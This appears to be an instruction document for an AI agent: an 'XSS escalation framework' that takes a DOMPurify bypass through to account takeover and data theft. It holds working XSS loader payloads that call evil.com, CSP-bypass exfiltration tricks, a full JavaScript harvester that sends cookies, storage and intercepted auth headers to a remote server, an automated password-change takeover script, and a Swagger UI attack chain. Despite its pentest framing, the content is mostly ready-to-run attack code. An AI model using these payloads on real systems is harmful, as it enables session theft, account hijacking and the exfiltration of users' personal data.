# AGENT TASK: XSS Escalation Framework - Bypass to Full Impact
# PURPOSE: Escalate any DOMPurify bypass to account takeover, data theft, persistence
# PRIORITY: Run AFTER confirming XSS - maximizes demonstrated impact
# PHASES: 1-Establish Execution, 2-Session Theft, 3-Account Takeover, 4-Data Exfil, 5-Impact Demo
# INPUTS: Confirmed XSS payload, target application authentication mechanism
# OUTPUT: ATO proof, data exfiltration evidence, impact demonstration
# SECTIONS: F20 (XSS Escalation Framework)
---

## SECTION F20: XSS Escalation Framework — From DOMPurify Bypass to Full Impact

### Overview

A DOMPurify bypass that achieves JavaScript execution is the starting point, not the end goal. This section documents the complete escalation methodology that authorized security researchers use to demonstrate maximum impact during penetration tests and bug bounty programs. Understanding these chains is essential for defenders to properly assess risk and prioritize remediation.

### Phase 1: Establishing Reliable Execution

Once a DOMPurify bypass payload is identified, the first challenge is turning it into reliable, persistent code execution.

**Challenge 1: Payload Size Constraints**

Many mXSS and namespace-confusion payloads leave limited space for the JavaScript payload. Solutions:

```
Technique: External Script Loader (Minimal Payload)
============================================================

Minimal payload (53 chars):
  <img src=x onerror="import('//evil.com/x.js')">

Alternative (fetch + eval, 62 chars):
  <img src=x onerror="fetch('//e.co/p').then(r=>r.text()).then(eval)">

Alternative (DOM script insertion, 89 chars):
  <img src=x onerror="var s=document.createElement('script');s.src='//e.co/p';document.head.appendChild(s)">

Base64-encoded payload (avoids quote/encoding issues):
  <img src=x onerror="eval(atob('ZmV0Y2goJy8vZS5jby9wJykudGhlbihyPT5yLnRleHQoKSkudGhlbihldmFsKQ=='))">
```

**Challenge 2: Content Security Policy (CSP)**

CSP can block external script loading, inline eval, and outbound connections. Bypass strategies:

```
CSP Bypass Decision Tree
========================

CSP blocks inline scripts?
  │
  ├─ YES ──► Does CSP allow 'unsafe-eval'?
  │            ├─ YES ──► Use eval-based payload
  │            └─ NO  ──► Check for allowed script-src domains
  │                        ├─ CDN with JSONP? ──► JSONP callback injection
  │                        │   Example: <script src="//cdn.example.com/jsonp?callback=alert"></script>
  │                        ├─ Angular/Vue on allowed CDN? ──► Template injection
  │                        │   Example: <div ng-app ng-csp><div ng-click="$event.view.alert(1)">click</div></div>
  │                        └─ base-uri not restricted? ──► <base> tag injection
  │                            <base href="https://attacker.com/">
  │                            (redirects all relative script/link/img URLs)
  │
  └─ NO ──► Standard inline payload works
  
CSP blocks connect-src to external domains?
  │
  ├─ YES ──► Exfiltration alternatives:
  │            ├─ DNS prefetch: <link rel=dns-prefetch href=//DATA.evil.com>
  │            ├─ WebRTC STUN: new RTCPeerConnection({iceServers:[{urls:'stun:DATA.evil.com'}]})
  │            ├─ CSS background: element.style.background = "url(//evil.com/DATA)"
  │            ├─ Navigation: location = "//evil.com/DATA" (if navigate-to not set)
  │            ├─ Meta refresh: <meta http-equiv=refresh content="0;url=//evil.com/DATA">
  │            └─ Form submission: auto-submit form with action=//evil.com/DATA
  │
  └─ NO ──► Standard fetch/XHR/sendBeacon exfiltration works
```

**Challenge 3: Stored vs Reflected Context**

```
Stored XSS (sanitized content saved to database):
  ► Payload persists across page loads
  ► All users viewing the content are affected
  ► Higher impact rating in bug bounties
  ► Can create self-propagating worms
  
Reflected XSS (sanitized content in URL parameters/fragments):
  ► Requires victim to click a crafted link
  ► Impact limited to single user per click
  ► Combine with phishing for mass exploitation
  ► URL shorteners hide suspicious payloads

DOM-based XSS (client-side sink after sanitization):
  ► No server interaction — harder to detect
  ► Payload often in URL fragment (after #)
  ► Fragment not sent to server — bypasses WAF/IDS
  ► Can be stored if fragment saved to localStorage/IndexedDB
```

### Phase 2: Session and Credential Theft

**Methodology: Identifying What to Steal**

```
Target Identification Checklist
================================

1. Check cookie accessibility:
   ► document.cookie — lists all non-HttpOnly cookies
   ► HttpOnly cookies: NOT accessible via JS (server-side theft needed)
   
2. Check storage:
   ► localStorage: JSON.stringify(localStorage) — get all keys/values
   ► sessionStorage: JSON.stringify(sessionStorage) — session-scoped data
   ► IndexedDB: enumerate databases with indexedDB.databases()
   
3. Check in-memory tokens:
   ► Hook fetch/XMLHttpRequest to capture Authorization headers
   ► Check window.__NEXT_DATA__, window.__NUXT__, window.__INITIAL_STATE__
   ► React: inspect React DevTools fiber tree for auth context
   ► Vue: inspect Vue instance $store for auth modules
   
4. Check meta tags:
   ► <meta name="csrf-token" content="...">
   ► <meta name="api-key" content="...">
   
5. Check embedded scripts:
   ► <script>var config = {..., apiKey: "...", ...}</script>
   ► window.ENV, window.CONFIG, window.APP_CONFIG
```

**Token Theft Implementation:**

```javascript
// Comprehensive token/credential harvester
// For authorized penetration testing only
(function() {
  const loot = {
    url: location.href,
    cookies: document.cookie,
    localStorage: {},
    sessionStorage: {},
    metaTags: {},
    globalVars: {},
    interceptedHeaders: []
  };
  
  // Harvest localStorage
  try {
    for (let i = 0; i < localStorage.length; i++) {
      const key = localStorage.key(i);
      loot.localStorage[key] = localStorage.getItem(key);
    }
  } catch(e) {}
  
  // Harvest sessionStorage
  try {
    for (let i = 0; i < sessionStorage.length; i++) {
      const key = sessionStorage.key(i);
      loot.sessionStorage[key] = sessionStorage.getItem(key);
    }
  } catch(e) {}
  
  // Harvest meta tags
  document.querySelectorAll('meta[name]').forEach(meta => {
    loot.metaTags[meta.name] = meta.content;
  });
  
  // Harvest known global config patterns
  const configKeys = [
    '__NEXT_DATA__', '__NUXT__', '__INITIAL_STATE__',
    'ENV', 'CONFIG', 'APP_CONFIG', 'SETTINGS',
    '__PRELOADED_STATE__', '__APP_INITIAL_STATE__'
  ];
  configKeys.forEach(key => {
    if (window[key]) {
      try { loot.globalVars[key] = JSON.stringify(window[key]); } catch(e) {}
    }
  });
  
  // Hook fetch to capture auth headers (for ongoing session monitoring)
  const origFetch = window.fetch;
  window.fetch = function() {
    const url = arguments[0];
    const opts = arguments[1] || {};
    if (opts.headers) {
      const headerObj = opts.headers instanceof Headers 
        ? Object.fromEntries(opts.headers.entries())
        : opts.headers;
      if (headerObj['Authorization'] || headerObj['X-API-Key'] || headerObj['X-CSRF-Token']) {
        loot.interceptedHeaders.push({url, headers: headerObj, timestamp: Date.now()});
      }
    }
    return origFetch.apply(this, arguments);
  };
  
  // Exfiltrate
  navigator.sendBeacon(
    'https://authorized-pentest-server.example.com/collect',
    new Blob([JSON.stringify(loot)], {type: 'application/json'})
  );
})();
```

### Phase 3: Account Takeover Patterns

```
Account Takeover Decision Tree
===============================

Got session cookie/token?
  │
  ├─ YES ──► Replay session from attacker's browser
  │          ├─ Cookie: Set in browser, navigate to app
  │          ├─ JWT: Set in Authorization header, make API calls
  │          └─ OAuth token: Use with API endpoints directly
  │
  └─ NO (HttpOnly cookies, no accessible tokens)
       │
       ├─ Can make authenticated API requests from victim's session?
       │    │
       │    ├─ YES ──► CSRF-via-XSS attacks:
       │    │          ├─ Change password/email (no current password required?)
       │    │          ├─ Add SSH key / API key / OAuth app
       │    │          ├─ Change notification email
       │    │          ├─ Add forwarding rule
       │    │          ├─ Invite attacker to org/team
       │    │          ├─ Export sensitive data
       │    │          └─ Escalate privileges (promote to admin)
       │    │
       │    └─ NO ──► Limited impact:
       │              ├─ Data exfiltration (read-only)
       │              ├─ Phishing (modify page to show fake login)
       │              ├─ Keylogging (capture credentials on re-auth)
       │              └─ Clickjacking via injected overlay
       │
       └─ Check for password reset flow vulnerability:
            ├─ Can trigger password reset from XSS context?
            ├─ Does reset email go to attacker-controlled address?
            └─ Can intercept reset token (via email forwarding rule)?
```

**Password Change Without Current Password:**

```javascript
// Many applications don't require current password for password change
// This is the highest-impact ATO technique
async function attemptPasswordChange() {
  // Step 1: Find the settings/security page
  const settingsPages = [
    '/settings/security', '/account/password', '/user/settings',
    '/settings/account', '/profile/security', '/api/v1/user/password'
  ];
  
  for (const page of settingsPages) {
    const resp = await fetch(page, { credentials: 'include' });
    if (resp.ok) {
      const html = await resp.text();
      
      // Step 2: Extract CSRF token
      const csrfMatch = html.match(/csrf[_-]?token['"]\s*(?:value|content)=['"]([^'"]+)/i)
        || html.match(/name=['"]_token['"][^>]*value=['"]([^'"]+)/i);
      
      if (csrfMatch) {
        // Step 3: Submit password change
        const formData = new FormData();
        formData.append('_token', csrfMatch[1]);
        formData.append('new_password', 'Pentest2024!SecurePass');
        formData.append('confirm_password', 'Pentest2024!SecurePass');
        
        const changeResp = await fetch(page, {
          method: 'POST',
          body: formData,
          credentials: 'include'
        });
        
        // Report result
        navigator.sendBeacon('https://pentest-server.example.com/report', 
          JSON.stringify({
            action: 'password_change',
            page: page,
            status: changeResp.status,
            success: changeResp.ok
          })
        );
      }
    }
  }
}
```

### Phase 4: Data Exfiltration Methodology

```
Data Exfiltration Prioritization
=================================

Priority 1 (Critical — Proves Maximum Impact):
  ├─ User credentials (passwords, API keys, tokens)
  ├─ PII (emails, phone numbers, addresses, SSNs)
  ├─ Financial data (credit cards, bank accounts)
  └─ Internal/confidential documents

Priority 2 (High — Demonstrates Broad Access):
  ├─ Other users' data (proves multi-user impact)
  ├─ Admin panel content
  ├─ Internal API endpoints
  └─ Configuration with secrets

Priority 3 (Medium — Shows Persistence):
  ├─ Email forwarding rules
  ├─ OAuth app authorizations
  ├─ Webhook endpoints
  └─ Notification settings
```

### Phase 5: Impact Demonstration for Bug Bounties

**Swagger UI → Account Takeover Chain (Real-World, 60+ Programs):**

```
Attack Flow
===========

Step 1: Find Swagger UI instance (Google dork: inurl:/api-docs OR inurl:/swagger-ui)
         │
Step 2: Check DOMPurify version in bundle
         │ (Swagger UI 3.14.1-3.37.x ships DOMPurify 2.2.2)
         │
Step 3: Craft payload exploiting bundled DOMPurify bypass
         │ (Swagger UI uses FORBID_TAGS: ['style'], 
         │  so adapt DOMPurify 2.2.3 bypass using <textarea> instead)
         │
Step 4: Inject via Swagger spec URL parameter
         │ https://target.com/api-docs?url=https://attacker.com/malicious-swagger.json
         │
Step 5: Malicious swagger.json contains XSS in description field
         │ The description is rendered through Remarkable markdown → DOMPurify → innerHTML
         │
Step 6: XSS executes in victim's browser session
         │
Step 7: Steal authToken from localStorage
         │ (Jamf Pro stored admin auth tokens in localStorage)
         │
Step 8: Use stolen token to access admin API
         │
Step 9: Full account takeover demonstrated
```

---

## SECTION F21: CSS Exfiltration Deep Methodology — Exploiting DOMPurify's Blind Spot
